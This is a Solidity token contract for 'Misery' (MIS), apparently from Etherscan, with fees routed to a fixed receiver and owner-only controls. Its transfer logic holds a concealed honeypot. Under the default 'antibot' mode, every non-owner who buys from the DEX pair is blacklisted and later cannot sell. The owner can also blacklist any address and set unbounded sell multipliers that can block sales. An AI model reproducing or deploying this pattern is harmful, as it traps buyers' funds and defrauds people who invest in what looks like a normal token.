/**
 *Submitted for verification at Etherscan.io on 2022-08-05
*/

/**

Not Euphoria But Misery.

*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.12;


interface IERC20 {
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MISERY is ERC20, Auth {
    using SafeMath for uint256;

    address immutable WETH;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;

    string public constant name = "Misery";
    string public constant symbol = "MIS";
    uint8 public constant decimals = 4;
    uint256 public constant totalSupply = 1 * 10**15 * 10**decimals;

    uint256 public _maxTxAmount = totalSupply / 100;
    uint256 public _maxWalletToken = totalSupply / 100;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isWalletLimitExempt;

    uint256 public constant allFee = 10;
    uint256 public constant totalFee = 10;
    uint256 public constant feeDenominator = 100;

    uint256 buyMultiplier = 100;
    uint256 sellMultiplier = 100;
    uint256 transferMultiplier = 100;

    address public allFeeReceiver;

    bool public antibot = true;
    mapping (address => uint) public firstbuy;
    bool public blacklistMode = true;
    mapping (address => bool) public isBlacklisted;

    IDEXRouter public router;
    address public pair;

    bool public swapEnabled = true;
    uint256 public swapThreshold = totalSupply / 200;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        allFeeReceiver = 0xa3186BBB22Fde18F2b2d988E287A7c65aAeF149b;

        isFeeExempt[msg.sender] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[ZERO] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[DEAD] = true;

        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable { }

    function getOwner() external view override returns (address) { return owner; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!isOwner(sender) && !isOwner(recipient) &&  antibot){
            if(sender == pair){
                if(firstbuy[recipient] == 0){
                    firstbuy[recipient] = block.number;
                }
                blacklist_wallet(recipient,true);
            }

            if(firstbuy[sender] > 0){
                require( firstbuy[sender] > (block.number - 20), "Bought before contract was launched");
            }
        }
        
        if(blacklistMode && !antibot){
            require(!isBlacklisted[sender],"Blacklisted");    
        }

        if (!isOwner(sender) && !isWalletLimitExempt[sender] && !isWalletLimitExempt[recipient] && recipient != pair) {
            require((balanceOf[recipient] + amount) <= _maxWalletToken,"max wallet limit reached");
        }

        require((amount <= _maxTxAmount) || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");

        if(shouldSwapBack()){ swapBack(); }

        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient]) ? amount : takeFee(sender, amount, recipient);

        balanceOf[recipient] = balanceOf[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        balanceOf[recipient] = balanceOf[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        if(amount == 0 || totalFee == 0){
            return amount;
        }

        uint256 multiplier = transferMultiplier;

        if(recipient == pair) {
            multiplier = sellMultiplier;
        } else if(sender == pair) {
            multiplier = buyMultiplier;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);

        balanceOf[address(this)] = balanceOf[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && balanceOf[address(this)] >= swapThreshold;
    }

    function manage_blacklist_status(bool _status) external onlyOwner {
        blacklistMode = _status;
    }

    function manage_blacklist(address[] calldata addresses, bool status) external onlyOwner {
        for (uint256 i=0; i < addresses.length; ++i) {
            blacklist_wallet(addresses[i],status);
        }
    }

    function blacklist_wallet(address _adr, bool _status) internal {
        if(_status && _adr == address(this)){
            return;
        }
        isBlacklisted[_adr] = _status;
    }

    function tradingOpen() external onlyOwner {
        antibot = false;
        sellMultiplier = 100;
    }


    function swapBack() internal swapping {
        uint256 amountToSwap = swapThreshold;
        bool success;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;
        //payable(allFeeReceiver).transfer(amountETH);
        (success,) = address(allFeeReceiver).call{value: amountETH}("");
    }


    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply.sub(balanceOf[DEAD]).sub(balanceOf[ZERO]);
    }

	function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 5,"Cannot set max wallet less than 0.5%");
        _maxWalletToken = (totalSupply * maxWallPercent_base1000 ) / 1000;
    }

    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner {
        require(maxTXPercentage_base1000 >= 5,"Cannot set max transaction less than 0.5%");
        _maxTxAmount = (totalSupply * maxTXPercentage_base1000 ) / 1000;
    }

	function setFeeReceivers(address _feeReceiver) external onlyOwner {
        allFeeReceiver = _feeReceiver;
    }

	function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external onlyOwner {
        sellMultiplier = _sell;
        buyMultiplier = _buy;
        transferMultiplier = _trans;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
		uint256 amountToClear = amountPercentage * address(this).balance / 100;
		payable(msg.sender).transfer(amountToClear);
	}

	function clearStuckToken(address tokenAddress, uint256 tokens) external onlyOwner returns (bool success) {
		if(tokens == 0){
			tokens = IERC20(tokenAddress).balanceOf(address(this));
		}
		return IERC20(tokenAddress).transfer(msg.sender, tokens);
	}

}